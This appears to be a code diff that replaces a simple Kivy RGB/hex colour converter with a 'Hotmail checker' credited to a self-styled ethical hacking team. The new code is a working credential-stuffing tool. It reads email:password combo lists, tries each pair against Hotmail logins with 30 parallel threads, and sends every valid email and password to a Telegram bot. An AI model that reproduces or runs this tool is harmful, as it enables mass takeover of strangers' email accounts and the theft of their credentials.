@@ -1,124 +1,115 @@
-import kivy
-kivy.require('1.9.1')
-from kivy.app import App
+import PKK
+import requests
+from concurrent.futures import ThreadPoolExecutor
 from kivy.lang import Builder
-from kivy.uix.label import Label
-from kivy.uix.button import Button
-from kivy.uix.relativelayout import RelativeLayout
-from kivy.uix.textinput import TextInput
-from kivy.animation import Animation
+from kivymd.app import MDApp
+from kivymd.uix.boxlayout import BoxLayout
+from kivymd.uix.label import MDLabel
+from kivymd.uix.textfield import MDTextField
+from kivymd.uix.button import MDRaisedButton
+from kivymd.uix.card import MDCard
+from kivy.clock import Clock
 
-Builder.load_string('''
-<updlbl>:
-    size:500,1000
-    canvas.before: 
-        Color: 
-            rgba: (1, 1, 1, 1) 
-        Rectangle: 
-            source:'background.png'
-            size: root.width, root.height 
-            pos: self.pos
-    Label:
-        id: updlbl
-        text: '[b]Output[/b]:'
-		font_size:"25sp"
-		pos_hint:{"x":-0.3,"y":-0.03}
-		color: "5d18d6"
-		markup: True
-	Label:
-    	text:"Rgb/Hex converter"
-    	pos_hint:{"y":0.46}
-    	background_color: "3d3d3d"
-    	font_size:"25sp"
-	Label:
-		text:"this is a small app by yashas :-)"
-		font_size:"8sp"
-	    color:(1,1,1,1)
- 	   pos_hint:{"x":0,"y":-0.4}
-	TextInput: 
-        id: input
-        hint_text:'Enter hex/rgb code:'
-        pos_hint: {'x': 0.1, 'y': 0.8} 
-        font_size: "20sp"
-        size_hint: 0.8, 0.09
-        padding: 40
-    Label:
-    	text:"hex format: xxxxxx   and   rgb format: xxx,xxx,xxx"
-    	font_size:"10sp"
-    	pos_hint:{"y":.27}
-    Button:
-        text: 'Convert'
-		size_hint:.4,.08
-		pos_hint:{"x":0.28,"y":0.6}
-		border:1,1,1,1
-		on_press:root.convert()
-	TextInput: 
-        id: output
-        hint_text:'Output will be shown here'
-        pos_hint: {'x': 0.1, 'y': 0.3}
-        font_size: "20sp"
-        size_hint: 0.8, 0.09
-        padding: 40
- ''')
+class HotmailChecker(BoxLayout):
+    def __init__(self, **kwargs):
+        super().__init__(orientation="vertical", **kwargs)
+        self.count_good = 0
+        self.count_bad = 0
 
-class updlbl(RelativeLayout):
-     def __init__(self, **kwargs):
-       super(updlbl,self).__init__(**kwargs)
-       pass
-     def ch_text(self, txxt):
-     	       self.ids.updlbl.text=txxt
-     	       anim = Animation(x=50, size=(80, 80), t='in_quad')
-     	       anim += Animation(x=-50,size=(40, 40), t='in_quad')
-     	       anim.repeat=True
-     	       anim.start(self.ids.updlbl)
-     def toHEX(self,sett):
-     		try:
-     			val = sett.split(",")
-     			conv = {0:0,1:1,2:2,3:3,4:4,5:5,6:6,7:7,8:8,9:9,10:"a",11:"b",12:"c",13:"d",14:"e",15:"f",16:"g"}
-     			t1 = str(float(val[0])/16).split(".")
-     			v1 = conv[int(t1[0])]
-     			v2 = conv[int(float("0."+t1[1])*16)]
-     			t2 = str(float(val[1])/16).split(".")
-     			v3 = conv[int(t2[0])]
-     			v4 = conv[int(float("0."+t2[1])*16)]
-     			t3 = str(float(val[2])/16).split(".")
-     			v5 = conv[int(t3[0])]
-     			v6 = conv[int(float("0."+t3[1])*16)]
-     			self.ids.output.text = f" #{v1}{v2}{v3}{v4}{v5}{v6}"
-     		except:
-     			self.ids.output.text = "Something is not correct, \ncheck again example of rgb code: 200,20,60"
-     def toRGB(self,sett):
-     		conv = {0:0,1:1,2:2,3:3,4:4,5:5,6:6,7:7,8:8,9:9,10:"a",11:"b",12:"c",13:"d",14:"e",15:"f",16:"g"}
-     		try:
-     			conv2 = {str(v): k for k, v in conv.items()}
-     			h1 = []
-     			for bb in sett:
-     				h1.append(bb)
-     			n1 = (int(conv2[h1[0]])*16)+(int(conv2[h1[1]]))
-     			n2 = (int(conv2[h1[2]])*16)+(int(conv2[h1[3]]))
-     			n3 = (int(conv2[h1[4]])*16)+(int(conv2[h1[5]]))
-     			hk = f"rgb({n1},{n2},{n3})"
-     			self.ids.output.text = hk
-     		except:
-     			self.ids.output.text = "something is not correct, \nplease enter in small letters and try. error:HEX"
-     			
-     def convert(self):
-     	code = "HEX"
-     	sett = self.ids.input.text
-     	for x in sett:
-     		if x == ',':
-     			code = "RGB"
-     		if code == "RGB":
-     			self.toHEX(sett)
-     		elif code == "HEX":
-     			self.toRGB(sett)
-     		else:
-     			self.ids.output.text = "oh no! something went wrong"
-	  
-class UpdateLabel(App):
-     def build(self):
-     	self.title = "Update Label"
-     	return updlbl()
+        # Header - Team Information with Green Color
+        self.add_widget(MDLabel(
+            text="TEAM: ETHICAL BUG HUNTER\nDeveloper: Last Warning\nTG ID: @hardhackar007",
+            theme_text_color="Custom", text_color=(0, 1, 0, 1), font_style="H5", halign="center"
+        ))
 
-if __name__ == '__main__':
-    UpdateLabel().run()
+        # Token Input
+        self.add_widget(MDLabel(text="Enter your Bot Token:", theme_text_color="Secondary", font_style="Body1"))
+        self.token_input = MDTextField(hint_text="Your Telegram Bot Token")
+        self.add_widget(self.token_input)
+
+        # ID Input
+        self.add_widget(MDLabel(text="Enter your Telegram ID:", theme_text_color="Secondary", font_style="Body1"))
+        self.id_input = MDTextField(hint_text="Your Telegram ID")
+        self.add_widget(self.id_input)
+
+        # File Path Input
+        self.add_widget(MDLabel(text="Enter your Combo Path:", theme_text_color="Secondary", font_style="Body1"))
+        self.file_input = MDTextField(hint_text="Path to combo.txt")
+        self.add_widget(self.file_input)
+
+        # Start Button
+        self.start_button = MDRaisedButton(text="START", on_press=self.start_check, size_hint=(None, None), size=("200dp", "50dp"))
+        self.add_widget(self.start_button)
+
+        # Status Labels
+        self.status_label = MDLabel(text="Waiting for input...", theme_text_color="Secondary", font_style="Subtitle1", halign="center")
+        self.add_widget(self.status_label)
+
+        # Good Login Label (Big & Green)
+        self.good_label = MDLabel(text="✅ GOOD LOGINS: 0", theme_text_color="Custom", text_color=(0, 1, 0, 1), font_style="H6", halign="center")
+        self.add_widget(self.good_label)
+
+        # Bad Login Label (Big & Red)
+        self.bad_label = MDLabel(text="❌ BAD LOGINS: 0", theme_text_color="Custom", text_color=(1, 0, 0, 1), font_style="H6", halign="center")
+        self.add_widget(self.bad_label)
+
+    def start_check(self, instance):
+        token = self.token_input.text
+        chat_id = self.id_input.text
+        file_path = self.file_input.text
+
+        if not token or not chat_id or not file_path:
+            self.status_label.text = "❌ Please fill all fields!"
+            return
+
+        self.status_label.text = "⏳ Checking logins..."
+        executor = ThreadPoolExecutor(max_workers=30)
+
+        try:
+            with open(file_path, "r") as f:
+                for line in f:
+                    if ":" in line:
+                        email, password = line.strip().split(":", 1)
+                        executor.submit(self.login, email, password, token, chat_id)
+        except Exception as e:
+            self.status_label.text = f"⚠️ Error: {e}"
+
+    def login(self, email, password, token, chat_id):
+        try:
+            response = PKK.Hotmail.Login(email, password)
+            if response.get("Login") == "Good":
+                self.count_good += 1
+                telegram_message = f"""
+┏━━━━━━━⍟
+┃ {email}
+┗━━━━━━━━━━━⊛
+┏━━━━⍟
+┃ {password}
+┗━━━━━━━━━━━⊛
+☠️ TOOL DEVELOPER BY LAST WARNING  
+    TG ID @hardhackar007 ☠️
+┏━━━━━━━⍟
+┃ Login URL: https://login.live.com
+┃ TEAM: ETHICAL BUG HUNTER
+┗━━━━━━━━━━━⊛
+"""
+                requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={telegram_message}")
+                Clock.schedule_once(lambda dt: self.update_good_label(), 0)
+            else:
+                self.count_bad += 1
+                Clock.schedule_once(lambda dt: self.update_bad_label(), 0)
+        except Exception as e:
+            pass
+
+    def update_good_label(self):
+        self.good_label.text = f"✅ GOOD LOGIN: {self.count_good}"
+
+    def update_bad_label(self):
+        self.bad_label.text = f"❌ BAD LOGIN: {self.count_bad}"
+
+class HotmailCheckerApp(MDApp):
+    def build(self):
+        return HotmailChecker()
+
+if __name__ == "__main__":
+    HotmailCheckerApp().run()
